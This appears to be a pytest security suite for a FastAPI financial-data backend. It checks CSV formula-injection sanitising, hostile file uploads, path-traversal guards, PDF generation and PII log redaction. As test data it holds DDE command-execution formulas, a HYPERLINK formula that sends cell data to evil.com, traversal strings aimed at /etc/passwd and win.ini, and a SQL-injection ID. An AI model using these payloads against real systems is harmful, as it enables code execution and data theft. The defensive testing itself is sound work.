"""
Tier 5 Adversarial Coverage Hardening — Security & Stress Test Suite
Author: Empirical Challenger 2 (critic & specialist)
Mission: Stress-test CSV injection, hostile uploads, path traversal, PDF generation, and Zero-PII logging filter.
"""

import io
from pathlib import Path
import pytest
from fastapi.testclient import TestClient
from fastapi import HTTPException
import pandas as pd

from backend.app.main import app
from backend.app.core.config import settings
from backend.app.core.security import (
    sanitize_csv_cell,
    sanitize_dataframe_for_export,
    validate_uuid_id,
    resolve_safe_path,
)
from backend.app.core.logging_filter import RedactingFilter
from backend.app.services.export_service import export_dataset
from backend.app.services.pdf_service import generate_pdf_report


@pytest.fixture(scope="module")
def client():
    """Reusable TestClient instance for API stress testing."""
    return TestClient(app)


# ==============================================================================
# 1. MALICIOUS CSV INJECTION PAYLOADS
# ==============================================================================

class TestMaliciousCsvInjectionPayloads:
    """Stress tests CSV formula injection defenses against sophisticated evasion techniques."""

    def test_formula_injection_prefixed_with_tab_and_carriage_return(self):
        """
        Adversarial test: Formulas disguised with leading tabs, carriage returns,
        or combinations to bypass naive '=+' prefix filters.
        """
        payloads = [
            "\t=cmd|' /C calc'!A0",
            "\r=cmd|' /C calc'!A0",
            "\t\r=1+1",
            "\r\t@SUM(1,2)",
            "\t+cmd|' /C calc'!A0",
            "\r-cmd|' /C calc'!A0",
        ]
        for p in payloads:
            sanitized = sanitize_csv_cell(p)
            assert str(sanitized).startswith("'"), (
                f"Payload {repr(p)} was not neutralized with leading single quote: {repr(sanitized)}"
            )

    def test_formula_injection_numeric_lookalikes(self):
        """
        Verify that formula injection defenses correctly distinguish genuine numbers
        from formula payloads masquerading as signed numbers.
        """
        # Genuine numbers must NOT be altered
        assert sanitize_csv_cell(100) == 100
        assert sanitize_csv_cell(-142.50) == -142.50
        assert sanitize_csv_cell("+100") == "+100"
        assert sanitize_csv_cell("-142.50") == "-142.50"
        assert sanitize_csv_cell("0") == "0"
        assert sanitize_csv_cell("+0.005") == "+0.005"

        # Formula payloads masquerading as signed numbers must be neutralized with leading single quote
        assert sanitize_csv_cell("+1+1") == "'+1+1"
        assert sanitize_csv_cell("-2+3*4") == "'-2+3*4"
        assert sanitize_csv_cell("+cmd|calc!A0") == "'+cmd|calc!A0"
        assert sanitize_csv_cell("-cmd|calc!A0") == "'-cmd|calc!A0"
        assert sanitize_csv_cell("@SUM(A1:A10)") == "'@SUM(A1:A10)"

    def test_formula_injection_mixed_unicode(self):
        """
        Verify formula injection payloads containing Arabic, non-ASCII, and URL-encoded
        characters are neutralized.
        """
        arabic_hyperlink = '=HYPERLINK("http://evil.com?id="&A1, "تقرير أمان عمان")'
        sanitized_arabic = sanitize_csv_cell(arabic_hyperlink)
        assert sanitized_arabic.startswith("'"), "Arabic HYPERLINK payload was not neutralized"

        arabic_concat = '@CONCATENATE("الأردن", " 2026")'
        sanitized_concat = sanitize_csv_cell(arabic_concat)
        assert sanitized_concat.startswith("'"), "Arabic CONCATENATE payload was not neutralized"

        # Normal Arabic strings without formula prefixes must remain untouched
        normal_arabic = "عمان - المملكة الأردنية الهاشمية"
        assert sanitize_csv_cell(normal_arabic) == normal_arabic

    def test_dataframe_export_sanitizes_cell_values(self):
        """
        Verify that exporting a full DataFrame to CSV and XLSX neutralizes all
        dangerous formula cells while keeping genuine numbers and safe text intact.
        """
        df = pd.DataFrame({
            "Customer_Name": ["=cmd|calc!A0", "Safe User", "@alert(1)"],
            "Amount": [-150.25, 200.0, 50.5],
            "Memo": ["\t=1+1", "Normal memo", "-sum(A1:A2)"],
        })

        # Test CSV export
        csv_bytes = export_dataset(df, format="csv")
        csv_text = csv_bytes.decode("utf-8")
        assert "'=cmd|calc!A0" in csv_text
        assert "'@alert(1)" in csv_text
        assert "'\t=1+1" in csv_text
        assert "'-sum(A1:A2)" in csv_text
        # Genuine negative number must remain valid
        assert "-150.25" in csv_text

        # Test XLSX export produces valid bytes
        xlsx_bytes = export_dataset(df, format="xlsx")
        assert len(xlsx_bytes) > 0
        assert xlsx_bytes[:4] == b"PK\x03\x04"

    def test_vulnerability_column_headers_formula_injection(self):
        """
        Adversarial White-Box Audit:
        Check whether formula injection payloads inside COLUMN HEADERS are sanitized.
        In spreadsheet applications (Excel, Calc), formula in cell A1 (the column name)
        will execute when opened.
        """
        hostile_df = pd.DataFrame({
            "=cmd|' /C calc'!A0": [1, 2, 3],
            "@SUM(1+1)": ["a", "b", "c"],
        })
        csv_bytes = export_dataset(hostile_df, format="csv")
        csv_text = csv_bytes.decode("utf-8")
        first_line = csv_text.splitlines()[0]

        # Check whether column names in first line are neutralized with a leading single quote
        assert first_line.startswith("'=cmd")
        assert "'@SUM(1+1)" in first_line


# ==============================================================================
# 2. HOSTILE FILE UPLOADS
# ==============================================================================

class TestHostileFileUploads:
    """Stress tests upload endpoints with corrupted, malformed, empty, and oversized payloads."""

    def test_upload_corrupt_zip_as_xlsx(self, client):
        """Uploading a corrupt ZIP file disguised as XLSX must return 422, not 500."""
        corrupt_zip = b"PK\x03\x04\x14\x00\x00\x00corrupt archive data"
        resp = client.post(
            "/api/datasets/upload",
            files={"file": ("malicious.xlsx", io.BytesIO(corrupt_zip), "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")},
        )
        assert resp.status_code == 422
        assert "Failed to parse" in resp.json()["detail"]

    def test_upload_unclosed_truncated_json(self, client):
        """Uploading unclosed/truncated JSON must return 422, not unhandled 500."""
        truncated_json = b'{"records": [{"name": "Alice", "age": 30}, {"name": "Bob"'
        resp = client.post(
            "/api/datasets/upload",
            files={"file": ("unclosed.json", io.BytesIO(truncated_json), "application/json")},
        )
        assert resp.status_code == 422
        assert "Failed to parse" in resp.json()["detail"]

    def test_upload_empty_csv_file(self, client):
        """Uploading a completely empty (0-byte) CSV must return 422, not crash."""
        resp = client.post(
            "/api/datasets/upload",
            files={"file": ("empty.csv", io.BytesIO(b""), "text/csv")},
        )
        assert resp.status_code == 422

    def test_upload_empty_xlsx_file(self, client):
        """Uploading a 0-byte XLSX must return 422, not crash."""
        resp = client.post(
            "/api/datasets/upload",
            files={"file": ("empty.xlsx", io.BytesIO(b""), "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")},
        )
        assert resp.status_code == 422

    def test_upload_empty_json_file(self, client):
        """Uploading a 0-byte JSON must return 422, not crash."""
        resp = client.post(
            "/api/datasets/upload",
            files={"file": ("empty.json", io.BytesIO(b""), "application/json")},
        )
        assert resp.status_code == 422

    def test_upload_header_only_zero_rows_csv(self, client):
        """Uploading a CSV with headers only (zero data records) must return 400."""
        header_only = b"Customer_Name,City,Amount\n"
        resp = client.post(
            "/api/datasets/upload",
            files={"file": ("headers_only.csv", io.BytesIO(header_only), "text/csv")},
        )
        assert resp.status_code == 400
        assert "zero records" in resp.json()["detail"].lower()

    def test_upload_binary_garbage_csv(self, client):
        """Uploading raw random binary garbage as CSV must be handled gracefully."""
        garbage = bytes([i % 256 for i in range(1024)])
        resp = client.post(
            "/api/datasets/upload",
            files={"file": ("garbage.csv", io.BytesIO(garbage), "text/csv")},
        )
        # Server must reject with 422 or return a valid response, never unhandled 500
        assert resp.status_code in (422, 400)

    def test_upload_disallowed_file_extension(self, client):
        """Uploading forbidden file extensions (.sh, .exe, .py, .bin) must return 400."""
        for ext in [".sh", ".exe", ".py", ".bin", ".tar.gz"]:
            resp = client.post(
                "/api/datasets/upload",
                files={"file": (f"script{ext}", io.BytesIO(b"echo 1"), "application/octet-stream")},
            )
            assert resp.status_code == 400
            assert "unsupported" in resp.json()["detail"].lower()


# ==============================================================================
# 3. PATH TRAVERSAL ATTEMPTS
# ==============================================================================

class TestPathTraversalResilience:
    """Stress tests path traversal guards across URL encoding, Windows backslashes, and null bytes."""

    def test_path_traversal_url_encoded_slash_preview(self, client):
        """URL-encoded traversal payload in dataset ID must be blocked (400 or 404)."""
        resp = client.get("/api/datasets/..%2F..%2Fetc%2Fpasswd/preview")
        assert resp.status_code in (400, 404)

    def test_path_traversal_double_encoded_preview(self, client):
        """Double URL-encoded traversal (%2e%2e%2f) must be blocked."""
        resp = client.get("/api/datasets/%2e%2e%2f%2e%2e%2ffinguard.db/preview")
        assert resp.status_code in (400, 404)

    def test_path_traversal_windows_backslashes(self, client):
        """Windows backslash traversal (..\\..\\windows\\win.ini) must be rejected with 400."""
        resp = client.get("/api/datasets/..%5C..%5Cwindows%5Cwin.ini/preview")
        assert resp.status_code in (400, 404)

    def test_path_traversal_export_csv(self, client):
        """Path traversal attempt in run export endpoint must be blocked."""
        resp = client.get("/api/runs/..%2F..%2Ffinguard.db/export/csv")
        assert resp.status_code in (400, 404)

    def test_path_traversal_report_pdf(self, client):
        """Path traversal attempt in PDF report endpoint must be blocked."""
        resp = client.get("/api/runs/%2e%2e%2f%2e%2e%2ffinguard.db/report/pdf")
        assert resp.status_code in (400, 404)

    def test_validate_uuid_id_rejects_traversal_payloads(self):
        """Unit test: validate_uuid_id must reject directory escape sequences and hostile IDs."""
        hostile_ids = [
            "../../etc/passwd",
            "..\\..\\windows\\system32",
            "%2e%2e%2f%2e%2e",
            "safe_id/../../../secret",
            "safe_id\x00evil",
            "",
            "   ",
            "id with spaces",
            "id;DROP TABLE datasets;--",
        ]
        for hid in hostile_ids:
            with pytest.raises(HTTPException) as exc_info:
                validate_uuid_id(hid)
            assert exc_info.value.status_code == 400

    def test_resolve_safe_path_boundary_enforcement(self, tmp_path):
        """Unit test: resolve_safe_path must prevent resolving outside base directory."""
        base_dir = tmp_path / "storage" / "raw"
        base_dir.mkdir(parents=True, exist_ok=True)

        # Legitimate subpath must succeed
        safe = resolve_safe_path(base_dir, "dataset_123.csv")
        assert safe == (base_dir / "dataset_123.csv").resolve()

        # Traversing upward must raise 403 Forbidden
        with pytest.raises(HTTPException) as exc_info:
            resolve_safe_path(base_dir, "../../etc/passwd")
        assert exc_info.value.status_code == 403
        assert "Path traversal" in exc_info.value.detail

        with pytest.raises(HTTPException) as exc_info:
            resolve_safe_path(base_dir, "..\\..\\windows\\win.ini")
        assert exc_info.value.status_code == 403


# ==============================================================================
# 4. PDF GENERATION STRESS TESTING
# ==============================================================================

class TestPdfGenerationStressTesting:
    """Stress tests ReportLab PDF generation under boundary conditions, Unicode, and special characters."""

    def test_pdf_report_empty_metadata_and_metrics(self):
        """Generating PDF with completely empty dicts must not crash and produce valid PDF binary."""
        pdf_bytes = generate_pdf_report(dataset_meta={}, metrics={})
        assert isinstance(pdf_bytes, bytes)
        assert len(pdf_bytes) > 1000
        assert pdf_bytes.startswith(b"%PDF-")
        assert b"%%EOF" in pdf_bytes

    def test_pdf_report_100_percent_suppressed_dataset(self):
        """
        Generating PDF report on 100% suppressed dataset (retained=0, supp_rate=1.0, achieved_k=0)
        must avoid ZeroDivisionError and render valid PDF.
        """
        dataset_meta = {
            "name": "Completely Suppressed Financial Dataset",
            "row_count": 500,
        }
        metrics = {
            "total_records": 500,
            "retained_records": 0,
            "suppressed_records": 500,
            "suppression_rate": 1.0,
            "achieved_k": 0,
            "k_satisfied": False,
            "curs": 0.0,
            "privacy_risk": {
                "prosecutor_risk": 1.0,
                "journalist_risk": 0.0,
                "marketer_risk": 0.0,
                "transaction_linkage_risk": 0.0,
            },
            "utility_metrics": {
                "composite_utility_score": 0.0,
                "record_retention": 0.0,
                "numerical_distribution_fidelity": 0.0,
                "categorical_distribution_fidelity": 0.0,
                "correlation_retention": 0.0,
            },
        }
        pdf_bytes = generate_pdf_report(dataset_meta=dataset_meta, metrics=metrics)
        assert pdf_bytes.startswith(b"%PDF-")
        assert b"%%EOF" in pdf_bytes

    def test_pdf_report_extreme_arabic_and_unicode_name(self):
        """
        Generating PDF with complex Arabic characters and punctuation in dataset name
        must not trigger font encoding crashes.
        """
        dataset_meta = {
            "name": "مجموعة بيانات المعاملات المالية للأفراد - عمان الأردن 2026",
            "row_count": 2500,
        }
        metrics = {
            "total_records": 2500,
            "retained_records": 2400,
            "suppressed_records": 100,
            "suppression_rate": 0.04,
            "k_satisfied": True,
            "achieved_k": 5,
        }
        pdf_bytes = generate_pdf_report(dataset_meta=dataset_meta, metrics=metrics)
        assert pdf_bytes.startswith(b"%PDF-")
        assert b"%%EOF" in pdf_bytes

    def test_pdf_report_handles_xml_special_characters_in_name(self):
        """
        Adversarial White-Box Audit:
        ReportLab Paragraph treats text as XML. If dataset name contains unclosed
        XML-like strings (e.g. 'Dataset <unclosed tag'), it can crash the parser.
        Verify whether the system sanitizes XML characters in dataset names.
        """
        dataset_meta = {
            "name": "Audit Report <Unclosed Tag",
            "row_count": 100,
        }
        pdf_bytes = generate_pdf_report(dataset_meta=dataset_meta, metrics={})
        assert pdf_bytes.startswith(b"%PDF-")
        assert b"%%EOF" in pdf_bytes


# ==============================================================================
# 5. ZERO RAW PII IN LOGS
# ==============================================================================

class TestZeroRawPiiInLogs:
    """Stress tests RedactingFilter against standard and formatted edge-case PII identifiers."""

    def test_logging_filter_redacts_standard_jordanian_iban(self):
        """Standard 30-char Jordanian IBAN must be redacted from logs."""
        raw_msg = "Dispatched settlement for JO94CBJO0010000001234567890123 successfully."
        redacted = RedactingFilter.redact_text(raw_msg)
        assert "JO94CBJO0010000001234567890123" not in redacted
        assert "[REDACTED_PII]" in redacted

    def test_logging_filter_redacts_standard_card_numbers(self):
        """16-digit Visa, Mastercard, and 15-digit Amex continuous PANs must be redacted."""
        cards = [
            ("Visa", "4111222233334444"),
            ("Mastercard", "5105105105105105"),
            ("Amex", "378282246310005"),
        ]
        for brand, pan in cards:
            raw_msg = f"Card transaction approved for PAN {pan}."
            redacted = RedactingFilter.redact_text(raw_msg)
            assert pan not in redacted, f"{brand} card number was not redacted: {redacted}"
            assert "[REDACTED_PII]" in redacted

    def test_logging_filter_redacts_national_id_and_email(self):
        """10-digit Jordanian National ID and email addresses must be redacted."""
        msg = "Customer national ID 9801012345 confirmed via email user@bank-jordan.jo."
        redacted = RedactingFilter.redact_text(msg)
        assert "9801012345" not in redacted
        assert "user@bank-jordan.jo" not in redacted
        assert "[REDACTED_PII]" in redacted

    def test_logging_filter_redacts_standard_jordanian_phone(self):
        """Standard Jordanian mobile numbers (079, 078, 077) must be redacted."""
        msg = "OTP sent to 0791234567."
        redacted = RedactingFilter.redact_text(msg)
        assert "0791234567" not in redacted
        assert "[REDACTED_PII]" in redacted

    def test_vulnerability_formatted_card_and_iban_pii_leakage(self):
        """
        Adversarial White-Box Audit:
        Real-world logs often receive formatted identifiers (spaced 4-4-4-4 card numbers,
        hyphenated cards, and 4-char spaced IBANs).
        Evaluate whether the filter redacts formatted identifiers or leaks raw PII.
        """
        spaced_card = "Card processed: 4111 2222 3333 4444"
        hyphen_card = "Card processed: 4111-2222-3333-4444"
        spaced_iban = "IBAN account: JO94 CBJO 0010 0000 0123 4567 8901 23"
        hyphen_phone = "Customer contact: 079-123-4567"

        redacted_spaced_card = RedactingFilter.redact_text(spaced_card)
        redacted_hyphen_card = RedactingFilter.redact_text(hyphen_card)
        redacted_spaced_iban = RedactingFilter.redact_text(spaced_iban)
        redacted_hyphen_phone = RedactingFilter.redact_text(hyphen_phone)

        assert "4111 2222 3333 4444" not in redacted_spaced_card
        assert "[REDACTED_PII]" in redacted_spaced_card

        assert "4111-2222-3333-4444" not in redacted_hyphen_card
        assert "[REDACTED_PII]" in redacted_hyphen_card

        assert "JO94 CBJO 0010 0000 0123 4567 8901 23" not in redacted_spaced_iban
        assert "[REDACTED_PII]" in redacted_spaced_iban

        assert "079-123-4567" not in redacted_hyphen_phone
        assert "[REDACTED_PII]" in redacted_hyphen_phone
